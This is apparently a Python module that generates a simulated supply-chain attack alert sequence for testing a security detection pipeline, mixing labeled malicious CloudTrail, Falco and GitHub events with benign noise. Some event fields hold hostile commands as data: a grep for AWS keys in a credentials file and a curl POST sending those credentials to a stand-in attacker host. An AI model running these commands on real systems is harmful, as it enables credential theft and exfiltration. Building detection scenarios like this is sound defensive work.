"""The `teampcp` supply-chain attack scenario (R11). A scripted ~3-minute alert
sequence whose malicious AWS events are drawn VERBATIM from real public attack
datasets (Splunk attack_data CreateAccessKey + S3 exfil), whose supply-chain
stage is backed by the real lodash CVE advisory, and whose benign noise is real
invictus-ir CloudTrail. GitHub/Falco stages are synthesized from vendor schemas.

build_teampcp() is pure (no I/O) and testable; runner.py emits it over the wire."""

from __future__ import annotations

import copy

from sentinel.datasets import loader

TOR = "185.220.101.45"


def _malicious() -> list[dict]:
    adv = loader.lodash_advisory()
    cve = (adv.get("aliases") or ["CVE-2021-23337"])[0]
    ghsa = adv.get("id", "GHSA-35jh-r3h4-6jhm")

    events: list[dict] = []

    # 1) Initial Access — compromised dependency w/ malicious postinstall (T1195.002)
    events.append({
        "t": 28, "source": "github", "event_name": "push", "verdict": "MALICIOUS",
        "label": "Compromised lodash dependency w/ postinstall hook",
        "payload": {
            "ref": "refs/heads/main",
            "head_commit": {
                "message": f"build(deps): bump lodash to 4.17.15 (adds postinstall) [{ghsa} / {cve}]",
                "added": [], "modified": ["package.json", "package-lock.json"],
            },
            "commits": [{"message": f"lodash@4.17.15 postinstall script — {cve} command injection"}],
            "repository": {"full_name": "teampcp/api", "private": True},
            "sender": {"login": "ci-bot", "type": "Bot"},
            "_dataset": f"GitHub Advisory DB {ghsa}",
        },
    })
    # 2) Execution — shell spawned by npm during install (T1059.004)
    events.append({
        "t": 33, "source": "falco", "event_name": None, "verdict": "MALICIOUS",
        "label": "Shell spawned by npm postinstall on CI runner",
        "payload": {
            "rule": "Terminal shell in container", "priority": "Critical", "source": "syscall",
            "time": "2026-05-30T14:00:33Z",
            "output_fields": {"proc.cmdline": "sh -c node ./node_modules/lodash/postinstall.js",
                              "proc.name": "sh", "proc.pname": "npm", "container.id": "ci-runner-12",
                              "container.name": "ci-runner-12", "user.name": "root"},
            "tags": ["container", "shell", "mitre_execution"], "_dataset": "falcosecurity/rules",
        },
    })
    # 3) Credential Access — Find AWS Credentials (T1552.001)
    events.append({
        "t": 38, "source": "falco", "event_name": None, "verdict": "MALICIOUS",
        "label": "Postinstall greps ~/.aws/credentials",
        "payload": {
            "rule": "Find AWS Credentials", "priority": "Warning", "source": "syscall",
            "time": "2026-05-30T14:00:38Z",
            "output_fields": {"proc.cmdline": "grep -r AKIA /root/.aws/credentials",
                              "proc.name": "grep", "proc.pname": "sh", "container.id": "ci-runner-12",
                              "user.name": "root"},
            "tags": ["container", "mitre_credential_access", "T1552"], "_dataset": "falcosecurity/rules",
        },
    })
    # 4) Exfiltration channel — outbound creds exfil (T1567.002)
    events.append({
        "t": 44, "source": "falco", "event_name": None, "verdict": "MALICIOUS",
        "label": "Stolen creds exfiltrated to attacker host",
        "payload": {
            "rule": "Netcat Remote Code Execution in Container", "priority": "Warning", "source": "syscall",
            "time": "2026-05-30T14:00:44Z",
            "output_fields": {"proc.cmdline": "curl -X POST https://198.51.100.9/x --data-binary @/tmp/creds",
                              "proc.name": "curl", "proc.pname": "sh", "container.id": "ci-runner-12",
                              "user.name": "root"},
            "tags": ["container", "network", "mitre_exfiltration"], "_dataset": "falcosecurity/rules",
        },
    })
    # 5) Lateral Movement — AssumeRole from Tor exit (T1078.004)
    events.append({
        "t": 70, "source": "aws_cloudtrail", "event_name": None, "verdict": "MALICIOUS",
        "label": "Stolen key used from Tor exit to AssumeRole",
        "payload": {
            "eventVersion": "1.08", "eventTime": "2026-05-30T14:01:10Z",
            "eventSource": "sts.amazonaws.com", "eventName": "AssumeRole", "awsRegion": "us-east-1",
            "sourceIPAddress": TOR, "userAgent": "aws-cli/2.15.0",
            "userIdentity": {"type": "IAMUser", "arn": "arn:aws:iam::1:user/ci-deploy-svc",
                             "accountId": "1", "accessKeyId": "AKIASTOLENKEY0001"},
            "requestParameters": {"roleArn": "arn:aws:iam::1:role/prod-admin", "roleSessionName": "x"},
            "resources": [{"ARN": "arn:aws:iam::1:role/prod-admin", "type": "AWS::IAM::Role"}],
            "readOnly": False, "managementEvent": True, "recipientAccountId": "1",
            "_dataset": "synthesized (AWS CloudTrail schema)",
        },
    })
    # 6) Discovery — recon from Tor (T1087.004)
    events.append({
        "t": 82, "source": "aws_cloudtrail", "event_name": None, "verdict": "MALICIOUS",
        "label": "Privilege recon from Tor exit",
        "payload": {
            "eventVersion": "1.08", "eventTime": "2026-05-30T14:01:22Z",
            "eventSource": "iam.amazonaws.com", "eventName": "ListUsers", "awsRegion": "us-east-1",
            "sourceIPAddress": TOR, "userAgent": "aws-cli/2.15.0",
            "userIdentity": {"type": "AssumedRole", "arn": "arn:aws:sts::1:assumed-role/prod-admin/x"},
            "readOnly": True, "managementEvent": True, "recipientAccountId": "1",
            "_dataset": "synthesized (AWS CloudTrail schema)",
        },
    })
    # 7) Persistence — CreateAccessKey on dormant user (T1098.001) — REAL Splunk event
    cak = copy.deepcopy(loader.createaccesskey_events()[0])
    cak["sourceIPAddress"] = TOR
    cak["requestParameters"] = {"userName": "svc-legacy-backup"}
    cak["_dataset"] = "Splunk attack_data T1078/aws_createaccesskey (real)"
    events.append({
        "t": 104, "source": "aws_cloudtrail", "event_name": None, "verdict": "MALICIOUS",
        "label": "CreateAccessKey on dormant IAM user (persistence)", "payload": cak,
    })
    # 8) Exfiltration — S3 mass-download of PII bucket (T1530) — REAL Splunk event
    exfil = copy.deepcopy(loader.s3_exfil_events()[0])
    exfil["sourceIPAddress"] = TOR
    exfil["requestParameters"] = {"bucketName": "teampcp-customer-pii", "key": "exports/all.csv"}
    exfil["resources"] = [{"type": "AWS::S3::Object", "ARN": "arn:aws:s3:::teampcp-customer-pii/exports/all.csv"}]
    exfil["_dataset"] = "Splunk attack_data T1530/aws_exfil_high_no_getobject (real, 1 of 100x burst)"
    events.append({
        "t": 128, "source": "aws_cloudtrail", "event_name": None, "verdict": "MALICIOUS",
        "label": "Mass GetObject on customer-PII bucket (exfiltration)", "payload": exfil,
    })
    return events


def _noise(count: int) -> list[dict]:
    """Benign noise — mostly REAL invictus-ir read events, plus a few synthesized
    Okta logins and GitHub pushes. Evenly spread across the replay window."""
    events: list[dict] = []
    reads = loader.benign_reads(limit=max(0, count - 8))
    users = ["alice@teampcp.io", "bob@teampcp.io", "carol@teampcp.io"]
    for i, rec in enumerate(reads):
        r = copy.deepcopy(rec)
        r["_dataset"] = "invictus-ir/aws_dataset (real)"
        events.append({"source": "aws_cloudtrail", "event_name": None, "verdict": "BENIGN",
                       "label": f"benign {r.get('eventName', 'read')}", "payload": r, "t": 0})
    for i in range(5):  # benign Okta logins
        events.append({"source": "okta_system_log", "event_name": None, "verdict": "BENIGN",
                       "label": "benign Okta login", "t": 0,
                       "payload": {"published": "2026-05-30T14:00:00Z", "eventType": "user.session.start",
                                   "severity": "INFO", "actor": {"alternateId": users[i % 3], "type": "User"},
                                   "client": {"ipAddress": f"34.201.5.{10 + i}"}, "outcome": {"result": "SUCCESS"}}})
    for i in range(3):  # benign GitHub pushes
        events.append({"source": "github", "event_name": "push", "verdict": "BENIGN",
                       "label": "benign push", "t": 0,
                       "payload": {"ref": "refs/heads/main",
                                   "head_commit": {"message": "docs: update", "modified": ["README.md"]},
                                   "repository": {"full_name": "teampcp/api"}, "sender": {"login": users[i % 3].split("@")[0]}}})
    # spread evenly across the window so noise interleaves with the chain
    n = len(events)
    for i, e in enumerate(events):
        e["t"] = 2 + int(i * (163.0 / max(1, n)))
    return events


def build_teampcp(noise_count: int = 42) -> list[dict]:
    events = _malicious() + _noise(noise_count)
    events.sort(key=lambda e: e["t"])
    return events


def scenario_stats(events: list[dict]) -> dict:
    mal = sum(1 for e in events if e["verdict"] == "MALICIOUS")
    benign = len(events) - mal
    return {"total": len(events), "malicious": mal, "benign": benign,
            "benign_pct": round(100 * benign / max(1, len(events)))}
